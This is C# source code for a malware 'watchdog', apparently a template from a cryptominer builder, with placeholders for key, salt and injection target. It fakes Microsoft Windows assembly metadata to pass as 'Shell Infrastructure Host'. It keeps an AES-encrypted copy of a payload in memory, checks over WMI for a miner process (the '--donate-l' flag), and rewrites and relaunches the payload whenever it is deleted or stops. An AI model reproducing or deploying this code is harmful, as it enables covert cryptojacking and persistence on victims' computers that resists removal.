using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

public partial class Watchdog
{
    public static byte[] xm = new byte[] { };
    public static string plp = "";
    public static int checkcount = 0;

    public static void Main()
    {
        try
        {
            plp = PayloadPath;
            xm = RAES_Encryptor(File.ReadAllBytes(plp));
            RWDLoop();
        }
        catch (Exception ex)
        {
            Environment.Exit(0);
        }
    }

    public static void RWDLoop()
    {
        try
        {
            if (!RCheckProc(RGetString("#InjectionTarget"), "--donate-l"))
            {
                if (!File.Exists(plp))
                {
                    File.WriteAllBytes(plp, RAES_Decryptor(xm));
                    Process.Start(plp);
                }
                else if (checkcount < 2)
                {
                    checkcount += 1;
                }
                else
                {
                    checkcount = 0;
                    Process.Start(plp);
                }
            }
            else
            {
                checkcount = 0;
                if (!File.Exists(plp))
                {
                    File.WriteAllBytes(plp, RAES_Decryptor(xm));
                    Process.Start(plp);
                }
            }

            int startDelay = 0;
            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
            {
                Thread.Sleep(startDelay * 1000 + 5000);
            }
            else
            {
                Thread.Sleep(10000);
            }

            RWDLoop();
        }
        catch { }

    }

    public static string RGetString(string input)
    {
        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
    }

    public static bool RCheckProc(string process, string contains)
    {
        try { 
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
            scope.Connect();
            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", process);
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(contains))
                {
                    return true;
                }
            }
        }
        catch { }

        return false;
    }

    public static byte[] RAES_Decryptor(byte[] input)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
            {
                cStream.Write(input, 0, input.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }

    public static byte[] RAES_Encryptor(byte[] input)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var encryptor = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, encryptor, CryptoStreamMode.Write))
            {
                cStream.Write(input, 0, input.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}